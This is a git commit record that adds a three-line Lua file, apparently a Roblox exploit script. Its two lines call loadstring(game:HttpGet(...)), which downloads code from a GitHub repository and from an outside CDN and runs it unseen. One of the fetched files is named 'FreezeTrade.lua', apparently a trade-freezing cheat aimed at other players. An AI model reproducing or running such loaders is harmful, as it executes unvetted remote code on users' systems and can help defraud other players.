f8b25d08c2340d7f5c64461a71944aa684e605c4
mokitlo <lvlasa187@gmail.com>
2026-08-03 21:45:16 +0300

    Create ni4ego.lua

---
+++ ni4ego.lua
@@ -0,0 +1,3 @@
+ID="cd88b44b-cbd8-494e-b5ed-d366272c33ee";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/mokitlo/nothing/refs/heads/main/FreezeTrade.lua"))();
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
